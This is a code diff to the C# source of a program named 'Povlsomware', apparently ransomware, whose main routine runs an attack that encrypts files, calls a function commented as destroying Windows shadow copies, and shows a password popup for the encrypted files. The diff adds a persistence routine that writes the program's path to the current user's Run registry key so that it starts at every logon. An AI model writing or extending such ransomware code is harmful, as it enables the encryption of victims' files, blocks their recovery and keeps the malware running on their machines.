@@ -7,6 +7,7 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Security.Principal;
 using System.Management;
+using Microsoft.Win32;
 
 namespace Povlsomware
 {
@@ -29,11 +30,25 @@ namespace Povlsomware
             //Start the attack
             Attack();
 
-            //Destroy copy
+            //Destroy ShadowCopy
             DestroyCopy();
-           
+
+            //Add simple persistance
+            SetStartup();
+
             //Creates a popup that lets you view the encrypted files and add the password
             CreateUI();
+
+        }
+
+        static void SetStartup()
+        {
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            if (rk.GetValue("Povlsomware") == null && !Application.ExecutablePath.Contains("rundll32.exe"))
+            {
+                rk.SetValue("Povlsomware", "\"" + Application.ExecutablePath + "\"");
+            }
+
         }
 
         static void CreateUI()
